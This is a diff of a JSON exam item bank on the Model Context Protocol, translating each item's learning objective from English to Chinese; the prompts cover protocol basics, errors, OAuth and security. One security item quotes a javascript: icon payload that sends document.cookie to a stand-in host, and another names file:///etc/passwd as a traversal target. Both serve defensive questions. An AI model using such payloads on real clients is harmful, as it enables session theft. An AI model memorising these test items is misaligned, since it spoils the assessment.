@@ -9,7 +9,7 @@
     {
       "id": "mcpa-f-m1-001",
       "domain": "mcp-fundamentals",
-      "objective": "Explain the purpose and scope of MCP and the integration problem it standardizes between AI applications and external systems",
+      "objective": "解释 MCP 的目的与范围，以及它在 AI 应用和外部系统之间标准化的集成问题",
       "prompt": "某平台团队目前为 6 个内部应用与 9 个外部系统之间的每一种组合分别维护手写连接器。随着应用和系统不断增加，连接器数量也持续增长。管理层询问，采用 MCP 这类用于上下文与工具访问的统一协议是否有帮助。最有力的理由是什么？",
       "type": "single",
       "options": [
@@ -30,7 +30,7 @@
     {
       "id": "mcpa-f-m1-002",
       "domain": "mcp-fundamentals",
-      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "objective": "阅读 MCP 规范、版本历史和功能生命周期，区分当前、已弃用和已移除的行为",
       "prompt": "一名刚加入团队的支持工程师告诉同事：每次 MCP 交互都必须先发送 initialize 请求，服务器才会接受其他调用。该同事正在查阅 2026-07-28 版规范，应当如何回应？",
       "type": "single",
       "options": [
@@ -52,7 +52,7 @@
     {
       "id": "mcpa-f-m1-003",
       "domain": "mcp-fundamentals",
-      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "objective": "阅读 MCP 规范、版本历史和功能生命周期，区分当前、已弃用和已移除的行为",
       "prompt": "某团队正在判断其客户端是否仍可安全依赖 roots 功能。一名工程师称该功能已在 2026-07-28 版中移除，必须立即删除；另一名工程师查看了弃用功能登记表。对于 roots 这类已弃用功能，登记表实际说明了什么？",
       "type": "single",
       "options": [
@@ -73,7 +73,7 @@
     {
       "id": "mcpa-f-m1-004",
       "domain": "mcp-fundamentals",
-      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "objective": "描述 MCP 的核心概念：宿主、客户端、服务端、原语和无状态 JSON-RPC 请求模型",
       "prompt": "运维人员将一台远程 MCP 服务器从单副本扩容为负载均衡器后的三个副本，且未启用粘性路由。某工具把每个客户端的累计值保存在进程内存中，此后各次调用返回的总数开始来回跳变。根本原因是什么？",
       "type": "single",
       "options": [
@@ -93,7 +93,7 @@
     {
       "id": "mcpa-f-m1-005",
       "domain": "mcp-fundamentals",
-      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "objective": "描述 MCP 的核心概念：宿主、客户端、服务端、原语和无状态 JSON-RPC 请求模型",
       "prompt": "一名曾开发 JSON-RPC 批处理客户端的开发者，希望向 2026-07-28 版服务器发送一个包含多个工具调用的 HTTP POST 请求体，以减少往返次数。预期会发生什么？",
       "type": "single",
       "options": [
@@ -113,7 +113,7 @@
     {
       "id": "mcpa-f-m1-006",
       "domain": "mcp-fundamentals",
-      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "objective": "描述 MCP 的核心概念：宿主、客户端、服务端、原语和无状态 JSON-RPC 请求模型",
       "prompt": "一名新同事询问 host 与其使用的客户端和服务器之间是什么关系。哪项描述符合 2026-07-28 版架构？",
       "type": "single",
       "options": [
@@ -133,7 +133,7 @@
     {
       "id": "mcpa-f-m1-007",
       "domain": "mcp-fundamentals",
-      "objective": "Reason about interoperability, protocol versioning, and the value of one open protocol over per-system custom integrations",
+      "objective": "分析互操作性、协议版本控制，以及开放协议相较于按系统定制集成的价值",
       "prompt": "某供应商建议公司为每个合作伙伴系统分别开发定制 SDK，而不要采用 MCP，理由是统一协议会增加不必要的抽象。从互操作性角度看，最有力的反驳是什么？",
       "type": "single",
       "options": [
@@ -153,7 +153,7 @@
     {
       "id": "mcpa-f-m1-008",
       "domain": "mcp-fundamentals",
-      "objective": "Reason about interoperability, protocol versioning, and the value of one open protocol over per-system custom integrations",
+      "objective": "分析互操作性、协议版本控制，以及开放协议相较于按系统定制集成的价值",
       "prompt": "架构评审正在列举采用 MCP 这类开放统一协议、而不是自定义点对点集成的实际优势。哪两项说法正确？请选择两项。",
       "type": "multiple",
       "options": [
@@ -174,7 +174,7 @@
     {
       "id": "mcpa-f-m1-009",
       "domain": "mcp-fundamentals",
-      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "objective": "阅读 MCP 规范、版本历史和功能生命周期，区分当前、已弃用和已移除的行为",
       "prompt": "工程师阅读 2026-07-28 版变更日志时，看到一条包含特定 SEP 编号和简短标题的记录。要判断某功能目前是否适合依赖，应当如何使用这条记录？",
       "type": "single",
       "options": [
@@ -195,7 +195,7 @@
     {
       "id": "mcpa-f-m1-010",
       "domain": "mcp-fundamentals",
-      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "objective": "描述 MCP 的核心概念：宿主、客户端、服务端、原语和无状态 JSON-RPC 请求模型",
       "prompt": "某团队正在记录其 MCP 服务器为何让每个请求都自包含，而不依赖连接状态。这种无状态设计会带来哪两项结果？请选择两项。",
       "type": "multiple",
       "options": [
@@ -216,7 +216,7 @@
     {
       "id": "mcpa-f-m1-011",
       "domain": "architecture-and-components",
-      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "objective": "区分 MCP 宿主、客户端和服务端的职责，以及发现与能力协商如何连接它们",
       "prompt": "客户端对某工具发送 tools/call 请求。该工具的描述表明它可能向用户追问，但客户端请求并未声明 elicitation 能力。服务器应当怎么做？",
       "type": "single",
       "options": [
@@ -236,7 +236,7 @@
     {
       "id": "mcpa-f-m1-012",
       "domain": "architecture-and-components",
-      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "objective": "阅读定义 MCP 消息、工具定义、能力和服务端 manifest 的 schema 与结构化数据",
       "prompt": "某工具定义了描述结构化发票对象的 outputSchema。客户端调用该工具后，收到的 structuredContent 与此 schema 不匹配。这说明服务器实现存在什么问题？",
       "type": "single",
       "options": [
@@ -256,7 +256,7 @@
     {
       "id": "mcpa-f-m1-013",
       "domain": "architecture-and-components",
-      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "objective": "阅读定义 MCP 消息、工具定义、能力和服务端 manifest 的 schema 与结构化数据",
       "prompt": "清单审查人员看到一个工具定义，其 name 为 get_forecast，title 为 Get 7-Day Forecast。客户端调用该工具时，必须把哪个字段作为 params.name 发送？另一个字段有什么用途？",
       "type": "single",
       "options": [
@@ -277,7 +277,7 @@
     {
       "id": "mcpa-f-m1-014",
       "domain": "architecture-and-components",
-      "objective": "Trace the model interaction flow from a user request through the host, model, client, and server and back into model context",
+      "objective": "追踪从用户请求经宿主、模型、客户端、服务端，再回到模型上下文的交互流",
       "prompt": "在模型交互流程中，host 即将允许模型调用一个标注为破坏性的工具。host 的确认步骤应放在流程中的哪个位置？",
       "type": "single",
       "options": [
@@ -297,7 +297,7 @@
     {
       "id": "mcpa-f-m1-015",
       "domain": "architecture-and-components",
-      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "objective": "区分 MCP 宿主、客户端和服务端的职责，以及发现与能力协商如何连接它们",
       "prompt": "某平台团队运行两台 MCP 服务器：一台通过本地 stdio 提供文件系统访问，另一台通过远程 Streamable HTTP 集成 SaaS。审查人员称，host 在工具注册表中以相同方式对待二者，所以两台服务器共享同一信任边界。应当如何纠正？",
       "type": "single",
       "options": [
@@ -317,7 +317,7 @@
     {
       "id": "mcpa-f-m1-016",
       "domain": "architecture-and-components",
-      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "objective": "区分 MCP 宿主、客户端和服务端的职责，以及发现与能力协商如何连接它们",
       "prompt": "客户端正在判断使用服务器前何时必须调用 server/discover。关于发现机制，哪两项说法正确？请选择两项。",
       "type": "multiple",
       "options": [
@@ -338,7 +338,7 @@
     {
       "id": "mcpa-f-m1-017",
       "domain": "architecture-and-components",
-      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "objective": "阅读定义 MCP 消息、工具定义、能力和服务端 manifest 的 schema 与结构化数据",
       "prompt": "某工具的 inputSchema 完全没有 $schema 关键字，而客户端团队的校验库默认使用较旧的 JSON Schema 草案。客户端应采用哪种方言来校验参数？",
       "type": "single",
       "options": [
@@ -358,7 +358,7 @@
     {
       "id": "mcpa-f-m1-018",
       "domain": "architecture-and-components",
-      "objective": "Trace the model interaction flow from a user request through the host, model, client, and server and back into model context",
+      "objective": "追踪从用户请求经宿主、模型、客户端、服务端，再回到模型上下文的交互流",
       "prompt": "host 每轮都会为模型重新构建工具列表，但列表中的工具顺序会根据 host 代码中的字典迭代顺序随机变化。一名同事认为这无关紧要。为什么它其实是个问题？",
       "type": "single",
       "options": [
@@ -378,7 +378,7 @@
     {
       "id": "mcpa-f-m1-019",
       "domain": "interactions-and-execution",
-      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "objective": "识别协议原语和实用机制，包括工具、资源、prompt、补全、缓存、分页、传输和已弃用客户端功能",
       "prompt": "某工具的结果需要返回一张供模型推理的图片，以及一个指向大型日志文件的引用；模型不应被迫读取完整日志。哪种内容块组合能同时满足这两个需求？",
       "type": "single",
       "options": [
@@ -398,7 +398,7 @@
     {
       "id": "mcpa-f-m1-020",
       "domain": "interactions-and-execution",
-      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "objective": "识别协议原语和实用机制，包括工具、资源、prompt、补全、缓存、分页、传输和已弃用客户端功能",
       "prompt": "某 MCP 服务器通过 file:// 资源 URI 公开内部文档。安全审查人员担心，攻击者可构造 file:///etc/passwd 之类的 URI，越出预期文档目录。符合规范的服务器必须怎么做？",
       "type": "single",
       "options": [
@@ -418,7 +418,7 @@
     {
       "id": "mcpa-f-m1-021",
       "domain": "interactions-and-execution",
-      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "objective": "识别协议原语和实用机制，包括工具、资源、prompt、补全、缓存、分页、传输和已弃用客户端功能",
       "prompt": "客户端针对真实存在的 prompt 名称调用 prompts/get，却遗漏了该 prompt 声明为必填的参数。服务器应返回什么？",
       "type": "single",
       "options": [
@@ -438,7 +438,7 @@
     {
       "id": "mcpa-f-m1-022",
       "domain": "interactions-and-execution",
-      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "objective": "应用请求、通知、订阅和多轮交互模式，并处理每种结果类型",
       "prompt": "部署工具在继续执行前，需要用户确认某项高风险操作。按照 2026-07-28 版消息模式，服务器如何请求确认？",
       "type": "single",
       "options": [
@@ -458,7 +458,7 @@
     {
       "id": "mcpa-f-m1-023",
       "domain": "interactions-and-execution",
-      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "objective": "识别协议原语和实用机制，包括工具、资源、prompt、补全、缓存、分页、传输和已弃用客户端功能",
       "prompt": "某服务器目前使用 sampling create message，让客户端通过自己的模型执行补全。迁移审查指出该功能已弃用。建议用什么替代？",
       "type": "single",
       "options": [
@@ -478,7 +478,7 @@
     {
       "id": "mcpa-f-m1-024",
       "domain": "interactions-and-execution",
-      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "objective": "应用请求、通知、订阅和多轮交互模式，并处理每种结果类型",
       "prompt": "MCP 客户端与服务器之间的 stdio 连接在对话途中崩溃，客户端自动重启了服务器子进程。崩溃前，客户端有一个活动的 subscriptions/listen 流，用于监视工具列表变化。重启后，客户端必须怎么做才能继续接收这些通知？",
       "type": "single",
       "options": [
@@ -499,7 +499,7 @@
     {
       "id": "mcpa-f-m1-025",
       "domain": "interactions-and-execution",
-      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "objective": "处理协议错误和工具执行错误，包括版本、能力、标头和验证失败",
       "prompt": "运维人员调试失败的工具调用时，看到代码为 -32602 的 JSON-RPC 错误，而不是 isError 为 true 的结果。哪种情况符合这一响应形式？",
       "type": "single",
       "options": [
@@ -520,7 +520,7 @@
     {
       "id": "mcpa-f-m1-026",
       "domain": "interactions-and-execution",
-      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "objective": "处理协议错误和工具执行错误，包括版本、能力、标头和验证失败",
       "prompt": "代码审查人员看到一个拉取请求：只要工具参数违反业务规则，例如折扣百分比超过上限，就返回 JSON-RPC -32602 错误。审查人员应指出什么？",
       "type": "single",
       "options": [
@@ -540,7 +540,7 @@
     {
       "id": "mcpa-f-m1-027",
       "domain": "interactions-and-execution",
-      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "objective": "处理协议错误和工具执行错误，包括版本、能力、标头和验证失败",
       "prompt": "多台 MCP 服务器前的网关收到一个 POST 请求，其 MCP-Protocol-Version 请求头与请求元数据中的 protocolVersion 值不一致。网关应怎么做？",
       "type": "single",
       "options": [
@@ -560,7 +560,7 @@
     {
       "id": "mcpa-f-m1-028",
       "domain": "interactions-and-execution",
-      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "objective": "识别协议原语和实用机制，包括工具、资源、prompt、补全、缓存、分页、传输和已弃用客户端功能",
       "prompt": "host 开发者正在决定缓存一台变化缓慢的 MCP 服务器中的哪些内容，以降低 agent 下一轮的延迟。哪两种做法符合 2026-07-28 版缓存模型？请选择两项。",
       "type": "multiple",
       "options": [
@@ -581,7 +581,7 @@
     {
       "id": "mcpa-f-m1-029",
       "domain": "interactions-and-execution",
-      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "objective": "梳理工具调用从发现、选择、调用、用户输入、进度、取消到结果的生命周期",
       "prompt": "某团队正在开发报表生成工具。根据报表大小，运行时间可能从几秒到二十分钟不等，期间客户端可能断开并重新连接。哪种方案最合适？",
       "type": "single",
       "options": [
@@ -601,7 +601,7 @@
     {
       "id": "mcpa-f-m1-030",
       "domain": "interactions-and-execution",
-      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "objective": "梳理工具调用从发现、选择、调用、用户输入、进度、取消到结果的生命周期",
       "prompt": "运维人员看到一个已被客户端取消的工具调用，但片刻后服务器仍返回了该调用的迟到结果。正确的处理方式是什么？",
       "type": "single",
       "options": [
@@ -622,7 +622,7 @@
     {
       "id": "mcpa-f-m1-031",
       "domain": "interactions-and-execution",
-      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "objective": "应用请求、通知、订阅和多轮交互模式，并处理每种结果类型",
       "prompt": "服务器返回 InputRequiredResult，其中 inputRequests 映射使用 confirm_deploy 和 pick_region 两个键，但没有 requestState。客户端重试原始 tools/call 时必须如何组织请求？",
       "type": "single",
       "options": [
@@ -642,7 +642,7 @@
     {
       "id": "mcpa-f-m1-032",
       "domain": "interactions-and-execution",
-      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "objective": "处理协议错误和工具执行错误，包括版本、能力、标头和验证失败",
       "prompt": "某团队正把仍要求 initialize 握手的旧服务器迁移到 2026-07-28 版线协议。过渡期间，兼容新旧两代协议的客户端通过 stdio 直接发送现代请求，但服务器返回的既不是 DiscoverResult，也不是已识别的现代错误。客户端应得出什么结论？",
       "type": "single",
       "options": [
@@ -662,7 +662,7 @@
     {
       "id": "mcpa-f-m1-033",
       "domain": "interactions-and-execution",
-      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "objective": "处理协议错误和工具执行错误，包括版本、能力、标头和验证失败",
       "prompt": "网关运维人员正在配置：向 2026-07-28 版 MCP 端点 POST 的每个请求必须包含哪些 HTTP 请求头。规范要求哪两个？请选择两项。",
       "type": "multiple",
       "options": [
@@ -683,7 +683,7 @@
     {
       "id": "mcpa-f-m1-034",
       "domain": "interactions-and-execution",
-      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "objective": "梳理工具调用从发现、选择、调用、用户输入、进度、取消到结果的生命周期",
       "prompt": "某团队审查 tasks 扩展，希望确认客户端轮询 tasks/get 时任务可报告哪些状态。以下哪两项是 2026-07-28 版设计中的真实状态？请选择两项。",
       "type": "multiple",
       "options": [
@@ -704,7 +704,7 @@
     {
       "id": "mcpa-f-m1-035",
       "domain": "security-and-governance",
-      "objective": "Locate the trust boundaries between host, client, server, model, and the tools and content a server exposes",
+      "objective": "定位宿主、客户端、服务端、模型以及服务端所暴露工具和内容之间的信任边界",
       "prompt": "某 host 提供一键配置：用户从网页粘贴一段配置，host 可启动其中描述的本地 stdio 服务器。在运行服务器命令前，host 必须做什么？",
       "type": "single",
       "options": [
@@ -725,7 +725,7 @@
     {
       "id": "mcpa-f-m1-036",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "客户端通过 HTTP 调用 MCP 服务器时未携带 token，收到 401 响应。客户端应如何发现哪个授权服务器为该资源签发 token？",
       "type": "single",
       "options": [
@@ -745,7 +745,7 @@
     {
       "id": "mcpa-f-m1-037",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "命令行 MCP 客户端遇到不声明支持 Client ID Metadata Document 的授权服务器，于是使用 localhost 重定向 URI 回退到动态客户端注册。其注册请求必须携带哪种 application_type？",
       "type": "single",
       "options": [
@@ -765,7 +765,7 @@
     {
       "id": "mcpa-f-m1-038",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "用户查看参数后，批准了一次破坏性的 delete_record 工具调用。片刻后，在同一轮中，模型又想调用另一个破坏性工具 archive_record。之前的批准是否覆盖这次新调用？",
       "type": "single",
       "options": [
@@ -785,7 +785,7 @@
     {
       "id": "mcpa-f-m1-039",
       "domain": "security-and-governance",
-      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "objective": "选择针对工具投毒、注入、token 滥用和过宽访问的风险与安全控制",
       "prompt": "安全负责人审查新服务器时发现，某工具的 icons 条目把 src 设为 javascript:fetch('https://collect.example/'+document.cookie)。渲染图标的客户端必须如何处理？",
       "type": "single",
       "options": [
@@ -806,7 +806,7 @@
     {
       "id": "mcpa-f-m1-040",
       "domain": "security-and-governance",
-      "objective": "Design auditability and observability so protocol activity can be traced, attributed, and reviewed",
+      "objective": "设计可审计性和可观测性，让协议活动可追踪、可归因、可复核",
       "prompt": "事故审查需要跨 host、客户端和实际执行工具的服务器追踪一次失败调用。哪种机制专门用于在这些链路之间传递关联信息？",
       "type": "single",
       "options": [
@@ -826,7 +826,7 @@
     {
       "id": "mcpa-f-m1-041",
       "domain": "security-and-governance",
-      "objective": "Locate the trust boundaries between host, client, server, model, and the tools and content a server exposes",
+      "objective": "定位宿主、客户端、服务端、模型以及服务端所暴露工具和内容之间的信任边界",
       "prompt": "一台尚未经过组织审核的服务器列出了某工具，其注解声称 readOnlyHint 为 true、destructiveHint 为 false。host 是否应仅凭这些注解，就允许模型跳过该工具通常需要的确认步骤？",
       "type": "single",
       "options": [
@@ -847,7 +847,7 @@
     {
       "id": "mcpa-f-m1-042",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "用户点击 Authorize 后被重定向回来并收到授权响应，但响应中指定的 issuer 与客户端在重定向前记录的 issuer 不一致。客户端必须怎么做？",
       "type": "single",
       "options": [
@@ -867,7 +867,7 @@
     {
       "id": "mcpa-f-m1-043",
       "domain": "security-and-governance",
-      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "objective": "选择针对工具投毒、注入、token 滥用和过宽访问的风险与安全控制",
       "prompt": "某服务器公开了一个调用昂贵外部搜索 API 的工具。如果不加限制，一个行为异常的客户端就可能耗尽服务器配额，影响所有其他用户。哪种控制措施最直接？",
       "type": "single",
       "options": [
@@ -887,7 +887,7 @@
     {
       "id": "mcpa-f-m1-044",
       "domain": "security-and-governance",
-      "objective": "Design auditability and observability so protocol activity can be traced, attributed, and reviewed",
+      "objective": "设计可审计性和可观测性，让协议活动可追踪、可归因、可复核",
       "prompt": "某团队正在设计 MCP 工具调用的审计日志。审查人员指出，草案会记录每次调用的完整原始参数，其中包括用户可能粘贴敏感数据的自由文本字段。设计应如何修改？",
       "type": "single",
       "options": [
@@ -907,7 +907,7 @@
     {
       "id": "mcpa-f-m1-045",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "某 MCP 代理代表多个不同下游客户端与第三方授权服务器通信时，统一使用一个静态 client id。为避免混淆代理问题，该设计还需要增加哪一步？",
       "type": "single",
       "options": [
@@ -927,7 +927,7 @@
     {
       "id": "mcpa-f-m1-046",
       "domain": "security-and-governance",
-      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "objective": "选择针对工具投毒、注入、token 滥用和过宽访问的风险与安全控制",
       "prompt": "某工作流只需读取客户订单历史，但团队准备授予它还能创建和取消订单的 scope。哪项原则应当阻止这一做法？",
       "type": "single",
       "options": [
@@ -947,7 +947,7 @@
     {
       "id": "mcpa-f-m1-047",
       "domain": "security-and-governance",
-      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "objective": "选择针对工具投毒、注入、token 滥用和过宽访问的风险与安全控制",
       "prompt": "策略引擎在批准候选服务器前，正根据已知 MCP 攻击面为其评分。以下哪三项是真实威胁，应纳入评分？请选择三项。",
       "type": "multiple",
       "options": [
@@ -969,7 +969,7 @@
     {
       "id": "mcpa-f-m1-048",
       "domain": "security-and-governance",
-      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "objective": "应用基于 OAuth 的授权、客户端注册、scope 和用户同意，让用户批准服务端可查看和执行的内容",
       "prompt": "某团队正在依据 2026-07-28 版授权要求检查其 MCP 客户端的 OAuth 实现。实际要求哪三种做法？请选择三项。",
       "type": "multiple",
       "options": [
@@ -991,7 +991,7 @@
     {
       "id": "mcpa-f-m1-049",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "objective": "梳理构建和部署 MCP 的团队角色、职责、治理与采用模式",
       "prompt": "某团队正在为新的远程 MCP 部署绘制职责矩阵。谁应负责实现 Protected Resource Metadata 并校验 token audience？",
       "type": "single",
       "options": [
@@ -1011,7 +1011,7 @@
     {
       "id": "mcpa-f-m1-050",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "objective": "为不同运维场景选择合适的原语或扩展",
       "prompt": "某团队公开了一个接受 repository 参数的 prompt，但用户经常在 host 表单中输错仓库名称。哪项 MCP 能力可让 host 在用户输入时建议有效值？",
       "type": "single",
       "options": [
@@ -1032,7 +1032,7 @@
     {
       "id": "mcpa-f-m1-051",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "objective": "分析客户端、服务端、SDK、扩展、网关和注册表之间的生态可移植性",
       "prompt": "一个以 com.example/my-extension 发布的第三方扩展对线协议格式作出了破坏性变更。维护者希望基于旧行为构建的集成无需修改仍能运行。维护者应怎么做？",
       "type": "single",
       "options": [
@@ -1052,7 +1052,7 @@
     {
       "id": "mcpa-f-m1-052",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "objective": "为不同运维场景选择合适的原语或扩展",
       "prompt": "某 MCP Apps 界面在 permissions 元数据中加入 camera 来申请摄像头访问，应用开发者因此认为沙箱 iframe 里现在一定能使用摄像头。这个假设正确吗？",
       "type": "single",
       "options": [
@@ -1072,7 +1072,7 @@
     {
       "id": "mcpa-f-m1-053",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "objective": "分析客户端、服务端、SDK、扩展、网关和注册表之间的生态可移植性",
       "prompt": "某平台团队在多台内部 MCP 服务器前部署网关，希望网关无需解析每个请求体即可路由客户端请求。网关应依据什么进行路由？",
       "type": "single",
       "options": [
@@ -1093,7 +1093,7 @@
     {
       "id": "mcpa-f-m1-054",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "objective": "梳理构建和部署 MCP 的团队角色、职责、治理与采用模式",
       "prompt": "某团队准备上线生产环境，希望进行一次端到端演练，同时覆盖发现、经过校验的工具调用、同意往返和审计日志，而不是分别孤立测试。这描述的是哪种演练？",
       "type": "single",
       "options": [
@@ -1113,7 +1113,7 @@
     {
       "id": "mcpa-f-m1-055",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "objective": "为不同运维场景选择合适的原语或扩展",
       "prompt": "某团队要把无人值守的夜间批处理作业连接到 MCP 服务器，完成机器到机器集成。普通的面向用户 OAuth 同意页面不适用于这一场景。团队应采用什么？",
       "type": "single",
       "options": [
@@ -1133,7 +1133,7 @@
     {
       "id": "mcpa-f-m1-056",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "objective": "梳理构建和部署 MCP 的团队角色、职责、治理与采用模式",
       "prompt": "某平台团队正在选择 SDK 来构建新的生产级 MCP 服务器，希望在规范一致性和关键缺陷修复速度上获得有力保证。其他条件相同时，应优先选择哪个 SDK 层级？",
       "type": "single",
       "options": [
@@ -1153,7 +1153,7 @@
     {
       "id": "mcpa-f-m1-057",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "objective": "分析客户端、服务端、SDK、扩展、网关和注册表之间的生态可移植性",
       "prompt": "某工作组希望先公开孵化一个新的 MCP 扩展，再提议将其转为官方扩展。按照扩展流程，早期工作应放在哪里？",
       "type": "single",
       "options": [
@@ -1173,7 +1173,7 @@
     {
       "id": "mcpa-f-m1-058",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "objective": "分析客户端、服务端、SDK、扩展、网关和注册表之间的生态可移植性",
       "prompt": "某聚合服务团队计划把官方 MCP Registry 镜像到自己的客户目录中。注册表当前的状态意味着团队应为哪些情况做准备？",
       "type": "single",
       "options": [
@@ -1193,7 +1193,7 @@
     {
       "id": "mcpa-f-m1-059",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "objective": "为不同运维场景选择合适的原语或扩展",
       "prompt": "host 开发者正在实现 MCP Apps 扩展支持，并研究 UI 资源自身的元数据如何约束沙箱 iframe。哪三项说法正确？请选择三项。",
       "type": "multiple",
       "options": [
@@ -1215,7 +1215,7 @@
     {
       "id": "mcpa-f-m1-060",
       "domain": "use-cases-and-ecosystem",
-      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "objective": "梳理构建和部署 MCP 的团队角色、职责、治理与采用模式",
       "prompt": "综合项目就绪审查正在确认，团队的端到端演练在认证前是否真正覆盖了 2026-07-28 版的完整范围。演练应包含哪三个要素？请选择三项。",
       "type": "multiple",
       "options": [
